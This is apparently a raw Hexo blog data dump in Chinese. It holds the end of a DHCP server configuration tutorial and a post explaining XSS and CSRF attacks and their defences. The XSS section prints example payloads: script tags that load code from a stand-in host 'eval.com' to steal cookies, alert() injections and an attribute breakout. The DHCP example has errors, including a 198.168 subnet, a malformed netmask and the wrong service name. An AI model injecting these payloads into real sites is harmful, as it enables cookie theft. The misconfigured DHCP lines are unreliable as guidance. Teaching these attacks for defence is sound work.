class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/dhcpd.conf </span><br><span class=\"line\"># dhcpd.conf</span><br><span class=\"line\">#</span><br><span class=\"line\"># Sample configuration file for ISC dhcpd</span><br><span class=\"line\">#</span><br><span class=\"line\"># option definitions common to all supported networks...</span><br><span class=\"line\">option domain-name &quot;example.org&quot;;</span><br><span class=\"line\">option domain-name-servers ns1.example.org, ns2.example.org;</span><br><span class=\"line\">default-lease-time 600;</span><br><span class=\"line\">max-lease-time 7200;</span><br><span class=\"line\"># Use this to enble / disable dynamic dns updates globally.</span><br><span class=\"line\">#ddns-update-style none;</span><br><span class=\"line\"># If this DHCP server is the official DHCP server for the local</span><br><span class=\"line\"># network, the authoritative directive should be uncommented.</span><br><span class=\"line\">#authoritative;</span><br><span class=\"line\"># Use this to send dhcp log messages to a different log file (you also</span><br><span class=\"line\"># have to hack syslog.conf to complete the redirection).</span><br><span class=\"line\">log-facility local7;</span><br><span class=\"line\"># No service will be given on this subnet, but declaring it helps the </span><br><span class=\"line\"># DHCP server to understand the network topology.</span><br><span class=\"line\">subnet 10.152.187.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># This is a very basic subnet declaration.</span><br><span class=\"line\">subnet 10.254.239.0 netmask 255.255.255.224 &#123;</span><br><span class=\"line\">  range 10.254.239.10 10.254.239.20;</span><br><span class=\"line\">  option routers rtr-239-0-1.example.org, rtr-239-0-2.example.org;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># This declaration allows BOOTP clients to get dynamic addresses,</span><br><span class=\"line\"># which we don&apos;t really recommend.</span><br><span class=\"line\">subnet 10.254.239.32 netmask 255.255.255.224 &#123;</span><br><span class=\"line\">  range dynamic-bootp 10.254.239.40 10.254.239.60;</span><br><span class=\"line\">  option broadcast-address 10.254.239.31;</span><br><span class=\"line\">  option routers rtr-239-32-1.example.org;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># A slightly different configuration for an internal subnet.</span><br><span class=\"line\">subnet 10.5.5.0 netmask 255.255.255.224 &#123;</span><br><span class=\"line\">  range 10.5.5.26 10.5.5.30;</span><br><span class=\"line\">  option domain-name-servers ns1.internal.example.org;</span><br><span class=\"line\">  option domain-name &quot;internal.example.org&quot;;</span><br><span class=\"line\">  option routers 10.5.5.1;</span><br><span class=\"line\">  option broadcast-address 10.5.5.31;</span><br><span class=\"line\">  default-lease-time 600;</span><br><span class=\"line\">  max-lease-time 7200;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># Hosts which require special configuration options can be listed in</span><br><span class=\"line\"># host statements.   If no address is specified, the address will be</span><br><span class=\"line\"># allocated dynamically (if possible), but the host-specific information</span><br><span class=\"line\"># will still come from the host declaration.</span><br><span class=\"line\">host passacaglia &#123;</span><br><span class=\"line\">  hardware ethernet 0:0:c0:5d:bd:95;</span><br><span class=\"line\">  filename &quot;vmunix.passacaglia&quot;;</span><br><span class=\"line\">  server-name &quot;toccata.example.com&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># Fixed IP addresses can also be specified for hosts.   These addresses</span><br><span class=\"line\"># should not also be listed as being available for dynamic assignment.</span><br><span class=\"line\"># Hosts for which fixed IP addresses have been specified can boot using</span><br><span class=\"line\"># BOOTP or DHCP.   Hosts for which no fixed address is specified can only</span><br><span class=\"line\"># be booted with DHCP, unless there is an address range on the subnet</span><br><span class=\"line\"># to which a BOOTP client is connected which has the dynamic-bootp flag</span><br><span class=\"line\"># set.</span><br><span class=\"line\">host fantasia &#123;</span><br><span class=\"line\">  hardware ethernet 08:00:07:26:c0:a5;</span><br><span class=\"line\">  fixed-address fantasia.example.com;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># You can declare a class of clients and then do address allocation</span><br><span class=\"line\"># based on that.   The example below shows a case where all clients</span><br><span class=\"line\"># in a certain class get addresses on the 10.17.224/24 subnet, and all</span><br><span class=\"line\"># other clients get addresses on the 10.0.29/24 subnet.</span><br><span class=\"line\">class &quot;foo&quot; &#123;</span><br><span class=\"line\">  match if substring (option vendor-class-identifier, 0, 4) = &quot;SUNW&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">shared-network 224-29 &#123;</span><br><span class=\"line\">  subnet 10.17.224.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">    option routers rtr-224.example.org;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  subnet 10.0.29.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">    option routers rtr-29.example.org;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pool &#123;</span><br><span class=\"line\">    allow members of &quot;foo&quot;;</span><br><span class=\"line\">    range 10.17.224.10 10.17.224.250;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pool &#123;</span><br><span class=\"line\">    deny members of &quot;foo&quot;;</span><br><span class=\"line\">    range 10.0.29.10 10.0.29.230;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>可以看到如上默认配置<br>配置格式如下<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 全局配置</span><br><span class=\"line\">参数或选项\t\t\t// 全局生效</span><br><span class=\"line\">#局部配置</span><br><span class=\"line\">声明 &#123;</span><br><span class=\"line\">\t参数或选项\t  // 局部生效</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h5 id=\"常用参数介绍\"><a href=\"#常用参数介绍\" class=\"headerlink\" title=\"常用参数介绍\"></a>常用参数介绍</h5><p>我在<a href=\"http://www.zyops.com/dhcp-working-procedure\" target=\"_blank\" rel=\"noopener\">其他人博客</a>看到常用参数说明，于是就拷贝下来<br><img src=\"/linux/use-dhcp/dhcp_config1.gif\" alt=\"dhcp_config1\"><br><img src=\"/linux/use-dhcp/dhcp_config2.gif\" alt=\"dhcp_config2\"><br><img src=\"/linux/use-dhcp/dhcp_config3.gif\" alt=\"dhcp_config3\"></p><h5 id=\"配置实例\"><a href=\"#配置实例\" class=\"headerlink\" title=\"配置实例\"></a>配置实例</h5><p>某单位销售部有80台计算机所使用的IP地址段为<br>192.168.1.1-192.168.1.254,子网掩码为255.22.255.0，网关为<br>192.168.1.1,192.168.1.2-192.168.1.30给各服务器使用，客户<br>端仅可以使用192.168.1.100-192.168.1.200。剩余IP地址保留。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">subnet 198.168.1.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">\toption routers 192.168.1.1;</span><br><span class=\"line\">\toption subnet-mask 255.255.255.0;</span><br><span class=\"line\">\toption nis-domain\t\t\t\t&quot;domain.org&quot;;</span><br><span class=\"line\">\toption domain-name\t\t\t\t&quot;domain.org&quot;;</span><br><span class=\"line\">\toption domain-name-servers \t192.168.1.2;</span><br><span class=\"line\">\toption time-offset \t\t-18000;</span><br><span class=\"line\">\toption netbios-node-type \t\t2;</span><br><span class=\"line\">\trange dynamic-bootp\t198.168.1.100 192.168.1.200;</span><br><span class=\"line\">\tdefault-lease-time \t43200;</span><br><span class=\"line\">\thost ns &#123;</span><br><span class=\"line\">\t\tnext-server archlinux.org;</span><br><span class=\"line\">\t\thardware ethernet ...;</span><br><span class=\"line\">\t\tfixed-address ...;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h5 id=\"开启服务器\"><a href=\"#开启服务器\" class=\"headerlink\" title=\"开启服务器\"></a>开启服务器</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start dhcpcd</span><br></pre></td></tr></table></figure><h5 id=\"关闭服务器\"><a href=\"#关闭服务器\" class=\"headerlink\" title=\"关闭服务器\"></a>关闭服务器</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl stop dhcpcd</span><br></pre></td></tr></table></figure>"},{"title":"啥是XSS和CSRF?","date":"2019-04-18T10:18:49.000Z","dir":"http","keywords":["http","csrf","xss"],"_content":"\n本文通过介绍、原理、防御来讲解XSS以及CSRF。主要介绍及讲解攻击原理，及防御原理。\n\n# 啥是XSS？\n\n## XSS(Cross-site scripting)介绍\n\n以下是**Wikipedia**及**MDN**对XSS的介绍\n> Wikipedia:\n>\n> **跨网站指令码**（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是代码注入的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了HTML以及使用者端脚本语言。\n>\n> **XSS**攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。\n>\n> MDN:\n>\n> 跨站脚本攻击Cross-site scripting (XSS)是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者\n\n**划重点： 网站漏洞、HTML、脚本、恶意注入、获取权限**\n\n**总结：跨站脚本攻击用户加载恶意脚本，用户信息及权限等被恶意获取**\n\n## XSS原理\n\n被攻击的通常分为两种类型：**存储型XSS、反射型XSS**\n\n### 存储型XSS原理\n\n> 注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。\n\n下面看一个例子：\n\n```\n// html 评论\n<input name=\"comment\" id=\"comment\" value=\"<script src='http://eval.com'></script>\"/>\n\n// db\ninsert into table value(\"<script src='http://eval.com'></script>\")\n\n// 步骤\n1、恶意用户将评论带一个script标签，script带有恶意攻击，例如获取页面cookies\n2、评论被添加进数据库\n3、用户都可以看见评论，并加载一个script\n4、恶意script盗取用户信息\n```\n\n**总结：存储型XSS将恶意代码存储进数据库，用户加载恶意脚本时，恶意脚本将会从服务器上传回并执行**\n\n### 反射型XSS原理\n\n>  当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。\n\n下面看一个例子：\n\n```\n// url\nhttp://example.com?search=value'<script src=\"http://eval.com\"></script>'\n\n// html\n<input value=window.location.search>\n\n// 步骤\n1、网页内嵌值由参数直接传入\n2、恶意攻击者将参数包含script标签，加载恶意脚本\n3、恶意脚本在网页中生效，盗取用户信息\n```\n\n**总结：反射型XSS是通过链接参数或表单，通过点击链接、注入恶意脚本，网页加载后，恶意脚本将会执行**\n\n## XSS防御\n\n### XSS注入点\n\n在防御之前应该了解XSS有哪些注入点，其中包括HTML节点、HTML属性、JavaScript代码以及富文本\n\n#### HTML节点\n\nhtml节点包含用户输入内容，节点内容包含脚本\n\n```\n// HTML\n<div>${content}</div>\n// 用户输入，将content内容替换为<script>alert(1)</script>\n<div><script>alert(1)</script></div>\n```\n\n#### HTML属性\n\n```\n// HTML\n<img src=\"${src}\">\n// 用户输入，将src替换为 2\" onerror=\"alert(2)\n<img src=\"2\" onerror=\"alert(2)\">\n```\n\n#### JavaScript代码\n\n```\n// JS\n<script>\n\tvar data = \"${data}\"\n</script>\n// 用户输入，将data替换为 hello\";alert(3); var a = \"\n<script>\n\tvar data = \"hello\"; alert(3);var a = \"\"\n</script>\n```\n\n#### 富文本\n\n由于富文本需要保留html的原因，因此本身会有xss风险\n\n### XSS分析及防御\n\n了解攻击原理后，防御自然而然的也水到渠成了\n\n#### 浏览器自带防御\n\n浏览器自带一些防御能力，只能防御 XSS 反射类型攻击，且只能防御HTML属性\n\n防御原理是将可能会执行脚本的标签或属性进行转义和过滤。\n\n#### HTML节点内容及属性防御\n\n将<和>转译成&lt &gt，将单引号，双引号，&及空格等转译\n\n```\n// HTML\n<div>${content}</div>\n// 用户输入<script>alert(1)</script>后进行转译，将<>进行转译&ltscript&gtalert(1)&lt/script&gt\n<div>&ltscript&gtalert(1)&lt/script&gt</div>\n```\n\n####  Javascript代码防御\n\n使用JSON.stringify\n\n```\n// JS\n<script>\n\tvar data = \"${data}\"\n</script>\n// 用户输入，将data替换为 hello\";alert(3); var a = \",使用JSON.stringify(hello\";alert(3); var a = \")\n// 对输入内容会出现转译错误，结束操作\n```\n\n#### 富文本防御\n\n按照白名单保留部分标签和属性\n\n```\nvar whiteList = {\n    \"img\":[\"src\"],\n    \"a\":[\"href\"],\n    \"font\":[\"color\",\"size\"]\n};\nhtml.forEach(node => {\n    // 过滤白名单\n})\n```\n\n最佳方式使用第三方[js-xss](https://github.com/leizongmin/js-xss)白名单进行过滤\n\n### XSS攻击防御总结：\n\n* XSS是通过加载第三方脚本进行攻击\n* XSS攻击类型有存储型和反射型\n* XSS注入点包括HTML节点、HTML属性、JavaScript代码以及富文本\n* XSS防御通过浏览器自带防御、标签转译、JS代码JSON.stringify及白名单过滤进行防御\n\n# 啥又是CSRF？\n\n## CSRF(Cross Site Request forgery)介绍\n\n以下是**Wikipedia**及**MDN**对CSRF的介绍\n\n> Wikipedia:\n>\n> **跨站请求伪造**（英语：Cross-site request forgery），也被称为 **one-click attack** 或者 **session riding**，通常缩写为 **CSRF** 或者 **XSRF**， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法\n>\n> MDN:\n>\n> 跨站请求伪造（CSRF）是一种冒充受信任用户，向服务器发送非预期请求的攻击方式\n\n**划重点：跨站请求伪造、冒充受信任用户、发送非预期请求**\n\n**总结：CSRF是通过冒充用户来达到攻击目的的方式**\n\n## CSRF原理\n\nCSRF可以通过请求，携带用户登录态，伪造请求。在用户不知情的情况下，可利用用户身份完成业务请求\n\n```\n   www.a.com后端\n\t  ||\\       |\\\n   1||2          \\  3\n   \\||             \\\nwww.a.com前端         www.b.com\n\n1、用户登陆A网站\n2、A网站确认身份\n3、B网站页面向A网站发起请求（带A网站身份）\n```\n\n## CSRF分析及防御\n\n### CSRF原理分析\n\nB网站向A网站发起攻击原理：\n* B网站向A网站请求\n* 携带A网站Cookie\n* 不访问A网站前端\n* 请求的referer为B网站\n\n### CSRF防御\n\nCSRF的核心原理即：1、不直接访问A网站前端，而是通过B访问A，则可以通过**禁止使用第三方带来cookies，增加验证码、token机制**。2、B网站访问A网站，故所携带的referer为B网站。则可以通过**验证referer，禁止来自第三方请求**\n#### 禁止第三方网站带来cookies\n\n通过Cookie的SameSite禁止第三方访问\n\n```\nSet-Cookie: key=value; path=/; SameSite\n```\n\n由于SameSite兼容问题，对于大部分版本低的浏览器和部分浏览器不予支持。在使用中需考虑是否由于低版本问题而不生效，但SameSite不会因版本过低而报错，因此可放心使用\n\n详细[Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility)可点击查看\n\n#### 增加验证码，token\n\n由于生效机制是B网站访问A网站携带Cookie即获得信任，则可以通过增加必须操作时带入验证码及本地token携带\n\n#### 验证referer，禁止来自第三方的请求\n\n```\n// koa\nlet referer = ctx.request.headers.referer\nif (/^https?:\\/\\/example.com/.test(referer)) {\n  // error\n}\n```\n\n第三方访问的referer是第三方页面请求的referer，而非本身服务器请求的referer\n\n在判断第三方请求时，可使用正则表达式\n\n\n\n## CSRF攻击防御总结\n\n* CSRF攻击主要是恶意网站访问已经具有登录态的网站\n* 通过携带A网站的Cookie，以用户身份进行业务操作\n* 攻击原理的核心要点是不直接访问登录态网站及referer为攻击者网站\n* 防御核心原理是禁止第三方携带Cookie进行请求、增加验证码、token机制、验证referer及禁止第三方请求\n\n# 总结\n\nXSS和CSRF是常见的Web攻防，攻击者通过注入或伪装进行攻击。XSS防御可通过es6模版字符串解决大部分注入问题；CSRF则不使用简单Cookie作为登录态唯一凭证，禁止第三方请求杜绝绝大部分问题。","source":"_posts/what-is-xss-csrf.md","raw":"---\ntitle: 啥是XSS和CSRF?\ndate: 2019-04-18 18:18:49\ntags: http\ndir: http\nkeywords: \n  - http\n  - csrf\n  - xss\n---\n\n本文通过介绍、原理、防御来讲解XSS以及CSRF。主要介绍及讲解攻击原理，及防御原理。\n\n# 啥是XSS？\n\n## XSS(Cross-site scripting)介绍\n\n以下是**Wikipedia**及**MDN**对XSS的介绍\n> Wikipedia:\n>\n> **跨网站指令码**（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是代码注入的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了HTML以及使用者端脚本语言。\n>\n> **XSS**攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。\n>\n> MDN:\n>\n> 跨站脚本攻击Cross-site scripting (XSS)是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者\n\n**划重点： 网站漏洞、HTML、脚本、恶意注入、获取权限**\n\n**总结：跨站脚本攻击用户加载恶意脚本，用户信息及权限等被恶意获取**\n\n## XSS原理\n\n被攻击的通常分为两种类型：**存储型XSS、反射型XSS**\n\n### 存储型XSS原理\n\n> 注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。\n\n下面看一个例子：\n\n```\n// html 评论\n<input name=\"comment\" id=\"comment\" value=\"<script src='http://eval.com'></script>\"/>\n\n// db\ninsert into table value(\"<script src='http://eval.com'></script>\")\n\n// 步骤\n1、恶意用户将评论带一个script标签，script带有恶意攻击，例如获取页面cookies\n2、评论被添加进数据库\n3、用户都可以看见评论，并加载一个script\n4、恶意script盗取用户信息\n```\n\n**总结：存储型XSS将恶意代码存储进数据库，用户加载恶意脚本时，恶意脚本将会从服务器上传回并执行**\n\n### 反射型XSS原理\n\n>  当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。\n\n下面看一个例子：\n\n```\n// url\nhttp://example.com?search=value'<script src=\"http://eval.com\"></script>'\n\n// html\n<input value=window.location.search>\n\n// 步骤\n1、网页内嵌值由参数直接传入\n2、恶意攻击者将参数包含script标签，加载恶意脚本\n3、恶意脚本在网页中生效，盗取用户信息\n```\n\n**总结：反射型XSS是通过链接参数或表单，通过点击链接、注入恶意脚本，网页加载后，恶意脚本将会执行**\n\n## XSS防御\n\n### XSS注入点\n\n在防御之前应该了解XSS有哪些注入点，其中包括HTML节点、HTML属性、JavaScript代码以及富文本\n\n#### HTML节点\n\nhtml节点包含用户输入内容，节点内容包含脚本\n\n```\n// HTML\n<div>${content}</div>\n// 用户输入，将content内容替换为<script>alert(1)</script>\n<div><script>alert(1)</script></div>\n```\n\n#### HTML属性\n\n```\n// HTML\n<img src=\"${src}\">\n// 用户输入，将src替换为 2\" onerror=\"alert(2)\n<img src=\"2\" onerror=\"alert(2)\">\n```\n\n#### JavaScript代码\n\n```\n// JS\n<script>\n\tvar data = \"${data}\"\n</script>\n// 用户输入，将data替换为 hello\";alert(3); var a = \"\n<script>\n\tvar data = \"hello\"; alert(3);var a = \"\"\n</script>\n```\n\n#### 富文本\n\n由于富文本需要保留html的原因，因此本身会有xss风险\n\n### XSS分析及防御\n\n了解攻击原理后，防御自然而然的也水到渠成了\n\n#### 浏览器自带防御\n\n浏览器自带一些防御能力，只能防御 XSS 反射类型攻击，且只能防御HTML属性\n\n防御原理是将可能会执行脚本的标签或属性进行转义和过滤。\n\n#### HTML节点内容及属性防御\n\n将<和>转译成&lt &gt，将单引号，双引号，&及空格等转译\n\n```\n// HTML\n<div>${content}</div>\n// 用户输入<script>alert(1)</script>后进行转译，将<>进行转译&ltscript&gtalert(1)&lt/script&gt\n<div>&ltscript&gtalert(1)&lt/script&gt</div>\n```\n\n####  Javascript代码防御\n\n使用JSON.stringify\n\n```\n// JS\n<script>\n\tvar data = \"${data}\"\n</script>\n// 用户输入，将data替换为 hello\";alert(3); var a = \",使用JSON.stringify(hello\";alert(3); var a = \")\n// 对输入内容会出现转译错误，结束操作\n```\n\n#### 富文本防御\n\n按照白名单保留部分标签和属性\n\n```\nvar whiteList = {\n    \"img\":[\"src\"],\n    \"a\":[\"href\"],\n    \"font\":[\"color\",\"size\"]\n};\nhtml.forEach(node => {\n    // 过滤白名单\n})\n```\n\n最佳方式使用第三方[js-xss](https://github.com/leizongmin/js-xss)白名单进行过滤\n\n### XSS攻击防御总结：\n\n* XSS是通过加载第三方脚本进行攻击\n* XSS攻击类型有存储型和反射型\n* XSS注入点包括HTML节点、HTML属性、JavaScript代码以及富文本\n* XSS防御通过浏览器自带防御、标签转译、JS代码JSON.stringify及白名单过滤进行防御\n\n# 啥又是CSRF？\n\n## CSRF(Cross Site Request forgery)介绍\n\n以下是**Wikipedia**及**MDN**对CSRF的介绍\n\n> Wikipedia:\n>\n> **跨站请求伪造**（英语：Cross-site request forgery），也被称为 **one-click attack** 或者 **session riding**，通常缩写为 **CSRF** 或者 **XSRF**， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法\n>\n> MDN:\n>\n> 跨站请求伪造（CSRF）是一种冒充受信任用户，向服务器发送非预期请求的攻击方式\n\n**划重点：跨站请求伪造、冒充受信任用户、发送非预期请求**\n\n**总结：CSRF是通过冒充用户来达到攻击目的的方式**\n\n## CSRF原理\n\nCSRF可以通过请求，携带用户登录态，伪造请求。在用户不知情的情况下，可利用用户身份完成业务请求\n\n```\n   www.a.com后端\n\t  ||\\       |\\\n   1||2          \\  3\n   \\||             \\\nwww.a.com前端         www.b.com\n\n1、用户登陆A网站\n2、A网站确认身份\n3、B网站页面向A网站发起请求（带A网站身份）\n```\n\n## CSRF分析及防御\n\n### CSRF原理分析\n\nB网站向A网站发起攻击原理：\n* B网站向A网站请求\n* 携带A网站Cookie\n* 不访问A网站前端\n* 请求的referer为B网站\n\n### CSRF防御\n\nCSRF的核心原理即：1、不直接访问A网站前端，而是通过B访问A，则可以通过**禁止使用第三方带来cookies，增加验证码、token机制**。2、B网站访问A网站，故所携带的referer为B网站。则可以通过**验证referer，禁止来自第三方请求**\n#### 禁止第三方网站带来cookies\n\n通过Cookie的SameSite禁止第三方访问\n\n```\nSet-Cookie: key=value; path=/; SameSite\n```\n\n由于SameSite兼容问题，对于大部分版本低的浏览器和部分浏览器不予支持。在使用中需考虑是否由于低版本问题而不生效，但SameSite不会因版本过低而报错，因此可放心使用\n\n详细[Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility)可点击查看\n\n#### 增加验证码，token\n\n由于生效机制是B网站访问A网站携带Cookie即获得信任，则可以通过增加必须操作时带入验证码及本地token携带\n\n#### 验证referer，禁止来自第三方的请求\n\n```\n// koa\nlet referer = ctx.request.headers.referer\nif (/^https?:\\/\\/example.com/.test(referer)) {\n  // error\n}\n```\n\n第三方访问的referer是第三方页面请求的referer，而非本身服务器请求的referer\n\n在判断第三方请求时，可使用正则表达式\n\n\n\n## CSRF攻击防御总结\n\n* CSRF攻击主要是恶意网站访问已经具有登录态的网站\n* 通过携带A网站的Cookie，以用户身份进行业务操作\n* 攻击原理的核心要点是不直接访问登录态网站及referer为攻击者网站\n* 防御核心原理是禁止第三方携带Cookie进行请求、增加验证码、token机制、验证referer及禁止第三方请求\n\n# 总结\n\nXSS和CSRF是常见的Web攻防，攻击者通过注入或伪装进行攻击。XSS防御可通过es6模版字符串解决大部分注入问题；CSRF则不使用简单Cookie作为登录态唯一凭证，禁止第三方请求杜绝绝大部分问题。","slug":"what-is-xss-csrf","published":1,"updated":"2021-10-13T15:51:11.119Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0b001l4jzxhtgbx9tu","content":"<p>本文通过介绍、原理、防御来讲解XSS以及CSRF。主要介绍及讲解攻击原理，及防御原理。</p><h1 id=\"啥是XSS？\"><a href=\"#啥是XSS？\" class=\"headerlink\" title=\"啥是XSS？\"></a>啥是XSS？</h1><h2 id=\"XSS-Cross-site-scripting-介绍\"><a href=\"#XSS-Cross-site-scripting-介绍\" class=\"headerlink\" title=\"XSS(Cross-site scripting)介绍\"></a>XSS(Cross-site scripting)介绍</h2><p>以下是<strong>Wikipedia</strong>及<strong>MDN</strong>对XSS的介绍</p><blockquote><p>Wikipedia:</p><p><strong>跨网站指令码</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是代码注入的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了HTML以及使用者端脚本语言。</p><p><strong>XSS</strong>攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><p>MDN:</p><p>跨站脚本攻击Cross-site scripting (XSS)是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者</p></blockquote><p><strong>划重点： 网站漏洞、HTML、脚本、恶意注入、获取权限</strong></p><p><strong>总结：跨站脚本攻击用户加载恶意脚本，用户信息及权限等被恶意获取</strong></p><h2 id=\"XSS原理\"><a href=\"#XSS原理\" class=\"headerlink\" title=\"XSS原理\"></a>XSS原理</h2><p>被攻击的通常分为两种类型：<strong>存储型XSS、反射型XSS</strong></p><h3 id=\"存储型XSS原理\"><a href=\"#存储型XSS原理\" class=\"headerlink\" title=\"存储型XSS原理\"></a>存储型XSS原理</h3><blockquote><p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p></blockquote><p>下面看一个例子：</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// html 评论</span><br><span class=\"line\">&lt;input name=&quot;comment&quot; id=&quot;comment&quot; value=&quot;&lt;script src=&apos;http://eval.com&apos;&gt;&lt;/script&gt;&quot;/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">// db</span><br><span class=\"line\">insert into table value(&quot;&lt;script src=&apos;http://eval.com&apos;&gt;&lt;/script&gt;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">// 步骤</span><br><span 